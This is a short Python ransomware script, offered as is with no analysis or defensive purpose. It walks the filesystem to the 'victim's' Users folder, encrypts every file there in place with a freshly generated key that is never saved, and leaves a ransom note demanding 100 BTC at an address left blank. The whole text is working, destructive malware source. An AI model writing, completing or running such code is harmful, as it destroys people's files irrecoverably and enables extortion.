import subprocess

# Install required libraries
subprocess.call(['pip', 'install', 'cryptography'])

# Import required libraries
from cryptography.fernet import Fernet
import os

# Generate a new encryption key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Find the 'Users' folder in the whole available drive of the victim's system
for root, dirs, files in os.walk('/'):
    if 'Users' in dirs:
        target_dir = os.path.join(root, 'Users')
        break

# Recursively walk through the target directory and encrypt each file
for root, dirs, files in os.walk(target_dir):
    for filename in files:
        filepath = os.path.join(root, filename)
        with open(filepath, 'rb') as f:
            plaintext = f.read()
        ciphertext = cipher_suite.encrypt(plaintext)
        with open(filepath, 'wb') as f:
            f.write(ciphertext)

# Create a ransom note with the ransom amount and payment instructions
note = f'Your files have been encrypted. To get the decryption key, send {100} BTC to the following address: '
with open(os.path.join(target_dir, 'ransom_note.txt'), 'w') as f:
    f.write(note)
